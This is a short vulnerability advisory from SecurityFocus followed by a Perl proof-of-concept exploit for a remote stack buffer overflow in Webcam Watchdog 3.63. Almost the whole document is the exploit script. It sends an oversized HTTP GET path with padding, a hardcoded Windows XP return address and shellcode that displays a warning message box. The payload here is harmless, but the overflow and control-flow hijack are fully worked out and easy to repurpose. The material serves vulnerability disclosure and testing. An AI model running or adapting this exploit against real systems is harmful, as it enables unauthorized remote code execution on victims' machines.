source: http://www.securityfocus.com/bid/9351/info

A problem has been identified in the handling of remote web requests by the Webcam Watchdog software. Because of this, it may be possible for a remote attacker to gain unauthorized access to a vulnerable system. 

#!/usr/bin/perl -w
#
# Stack Overflow in Webcam Watchdog - Proof of Concept Exploit
#
# - Tested on version 3.63 - MessageBoxA Shellcode
#
# - By Peter Winter-Smith [peter4020@hotmail.com]

use IO::Socket;

if(!($ARGV[1]))
{
 print "\nUsage: wcwdpoc.pl <test_system> <port>\n" .
       "\tDefault port is 80\n\n";
 exit;
}

print "\nWebcam Watchdog 3.63 Stack Overflow PoC\n";


$target = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Unable to connect to $ARGV[0] on port $ARGV[1]";

$shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90" .
                        "\xEB\x5D\x5F\x55\x89\xE5\x81\xC4" .
                        "\xF0\xFF\xFF\xFF\x57\xFC\xB0\xFE" .
                        "\xF2\xAE\x80\x47\xFF\x30\x5F\x57" .
                        "\x31\xD2\xB9\xFF\xFF\xFF\xFF\xB2" .
                        "\x05\xB0\xFF\xF2\xAE\xFE\x47\xFF" .
                        "\x57\xFE\xCA\x80\xFA\x01\x75\xF3" .
                        "\x81\xEC\xFC\xFF\xFF\xFF\x89\xE3" .
                        "\xFF\x73\x0C\xBE\xFF\xEC\x59\x42" .
                        "\xC1\xEE\x08\xFF\x16\xFF\x73\x08" .
                        "\x50\xBE\xFF\xE4\x59\x42\xC1\xEE" .
                        "\x08\xFF\x16\x31\xC9\x51\xFF\x73" .
                        "\x04\xFF\x33\x51\xFF\xD0\xCC\x90" .
                        "\xE8\x9D\xFF\xFF\xFF\x75\x73\x65" .
                        "\x72\x33\x32\xFE\x64\x6C\x6C\xFF" .
                        "\x4D\x65\x73\x73\x61\x67\x65\x42" .
                        "\x6F\x78\x41\xFF\x57\x61\x72\x6E" .
                        "\x69\x6E\x67\x21\xFF\x54\x68\x69" .
                        "\x73\x5F\x76\x65\x72\x73\x69\x6F" .
                        "\x6E\x5F\x6F\x66\x5F\x57\x65\x62" .
                        "\x63\x61\x6D\x5F\x57\x61\x74\x63" .
                        "\x68\x64\x6F\x67\x5F\x69\x73\x5F" .
                        "\x76\x75\x6C\x6E\x65\x72\x61\x62" .
                        "\x6C\x65\x5F\x74\x6F\x5F\x72\x65" .
                        "\x6D\x6F\x74\x65\x5F\x63\x6F\x6D" .
                        "\x70\x72\x6F\x6D\x69\x73\x65\x21" .
                        "\xFF";

$ebp = "BBBB";
$eip = "\x59\xAE\xE9\x77"; # WinXP Home SP1 'kernel32.dll' - 'call esp'

$badpage = "a"x234 . $ebp . $eip . $shellcode;

$request = "GET /" . $badpage. " HTTP/1.1\r\n" .
           "User-Agent: WCSAXRView\r\n" .
           "Host: 127.0.0.1\r\n" .
           "Cache-Control: no-cache\r\n\r\n";

print $target $request;

print " + Testing remote system\n + MessageBox should appear if vulnerable!\n";

sleep(2);

close($target);

print "Done.\n";
exit;
